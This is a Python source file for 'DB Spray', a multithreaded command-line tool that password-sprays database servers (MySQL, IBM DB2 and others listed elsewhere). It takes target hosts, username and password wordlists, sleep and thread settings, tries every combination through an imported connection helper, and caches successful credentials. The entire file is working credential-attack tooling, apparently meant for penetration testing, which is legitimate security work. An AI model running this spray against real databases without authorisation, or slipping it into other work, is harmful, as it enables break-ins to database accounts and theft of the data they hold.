import ZHOR_Modules.fileManager as fm
import ZHOR_Modules.nicePrints as np
import ZHOR_Modules.listUtils as lu
import ZHOR_Modules.osUtils as osu
import ZHOR_Modules.SPTT as SPTT

import argparse
import sys
import threading
import os
import time

import _common



parser = argparse.ArgumentParser(description="DB Spray - Password spray on multiple DBMS " + _common._VERSION)
REQUIRED_ARGUMENTS = parser.add_argument_group("Required arguments")
OPTIONAL_ARGUMENTS = parser.add_argument_group("Optional arguments")



# Required arguments
REQUIRED_ARGUMENTS.add_argument('-t',metavar='"TARGET(s)"',type=str,required=True,help='Target IP/fqdn. Can either be a single target or a file')
REQUIRED_ARGUMENTS.add_argument('-u',metavar='"USERS"',type=str,required=True,help='Users list file')
REQUIRED_ARGUMENTS.add_argument('-p',metavar='"PASSWORDS"',type=str,required=True,help='Passwords list file')
REQUIRED_ARGUMENTS.add_argument('-s',metavar='"SLEEP"',type=int,required=True,help='Sleep time between each request (in milliseconds)')
REQUIRED_ARGUMENTS.add_argument('-T',metavar='"THREADS"',type=int,required=True,help='Threads (corresponding to concurrent requests)')

_dbmsHelpMsg = 'DBMS ({})'.format(lu.concatenate_elements(_common.SUPPORTED_DBMSES,', '))
REQUIRED_ARGUMENTS.add_argument('-D',metavar='"DBMS"',type=str,required=True,help=_dbmsHelpMsg)

# Optional arguments
OPTIONAL_ARGUMENTS.add_argument('-q',action="store_true",help='"Quiet" mode: Skip the initial recap and the "press enter to continue" message')
OPTIONAL_ARGUMENTS.add_argument('--timeout',type=int,required=False,help='Connection attempt timeout (in milliseconds). By default is 1000ms')
OPTIONAL_ARGUMENTS.add_argument('--debug',action="store_true",help="Debug mode")

# dbms specific flags
MYSQL_SPECIFIC_FLAGS = parser.add_argument_group("MySQL specifig flags")
MYSQL_SPECIFIC_FLAGS.add_argument('--mysql-no-ssl',action="store_true",help="Disable SSL checks for MySQL")

IBMDB2_SPECIFIC_FLAGS = parser.add_argument_group("IBMDB2 specifig flags")
IBMDB2_SPECIFIC_FLAGS.add_argument('--ibmdb2-db-name',type=str,help="Database name. By default is \"sampledb\"")

args = parser.parse_args()

np.DEBUG = ('--debug' in sys.argv)

# ========================================================================================================

TupleCacher = SPTT.TupleCacher('cache/db-spray-cache.db',columnNames=['target','username','password','dbms'],columnTypes=['TEXT','TEXT','BLOB','TEXT'])
#users       = None
#passwords   = None
sleepTime   = None
#threadCount = None


# function used by the threads
def threadWrapperFunction(threadID: int,triplets: list,dbms: str):
    
    # triplet structure
    # [target,user,password]
    for triplet in triplets:
        
        if TupleCacher.tupleExists((triplet[0],triplet[1],triplet[2],dbms)):    
            msg = "[Thread #{}] Skipped cached tuple {} {} {}".format(str(threadID),triplet[0],triplet[1],triplet[2])
            np.debugPrint(msg,lock=_common.STDOUT_LOCK)
        else:
            msg = "[Thread #{}] Testing {} {} {}".format(str(threadID),triplet[0],triplet[1],triplet[2])
            np.debugPrint(msg,lock=_common.STDOUT_LOCK)
            
            res = _common.attemptConnection(triplet[0],triplet[1],triplet[2],dbms)

            if res == 1:
                TupleCacher.insertSuccess((triplet[0],triplet[1],triplet[2],dbms))

            if res == 0:
                TupleCacher.insertFail((triplet[0],triplet[1],triplet[2],dbms))

            time.sleep(sleepTime)

# check and eventually set the dms specific flags
def dmbsSpecificFlagsCheck():

    # mysql
    if ('--mysql-no-ssl' in sys.argv):
        _common.MYSQL_DISABLE_SSL = True

    # ibm db2
    if ('--ibmdb2-db-name' in sys.argv):
        _common.IBMDB2_DATABASE = args.ibmdb2_db_name

if __name__ == '__main__':

    # check dbms
    if args.D not in _common.SUPPORTED_DBMSES:
        np.errorPrint("The specified DBMS is unknown or not currently supported by this script.")
        exit()

    

    quiet = '-q' in sys.argv
    dbms = args.D
    
    targets = []
    if os.path.isfile(args.t):
        targets = fm.fileToSimpleList(args.t)
    else:
        targets = [args.t]
    
    users = fm.fileToSimpleList(args.u)
    passwords = fm.fileToSimpleList(args.p)
    sleepTime = int(args.s) / 1000
    threadCount = args.T


    if '--timeout' in sys.argv:

        if args.timeout == 0:
            _common.CONNECTION_TIMEOUT = 0
        else:
            _common.CONNECTION_TIMEOUT = int(args.timeout) / 1000


    dmbsSpecificFlagsCheck()

    # organizing triplets
    triplets = lu.listsElementsPermutations([targets,users,passwords])
    threadList = []
    sublists = lu.splitList(triplets, threadCount)
    for i in range(0,threadCount):
        argument = sublists[i]
        t = threading.Thread(target=threadWrapperFunction,args=(i+1,sublists[i],dbms,))
        threadList.append(t)


    if not quiet:
        totalRequests = len(targets) * len(users) * len(passwords)
        msg = "Testing {} targets with {} usernames and {} passwords. Total requests: {}".format(
            str(len(targets)),
            str(len(users)),
            str(len(passwords)),
            totalRequests
        )
        np.infoPrint(msg)
        osu.pressEnterToContinue()


    # starting threads
    np.debugPrint("Starting threads")
    for thread in threadList:
        thread.start()


    # waiting for each thread to finish
    for thread in threadList:
        thread.join()

    TupleCacher.dumpToDB()
    np.infoPrint("Job done. Check log for results")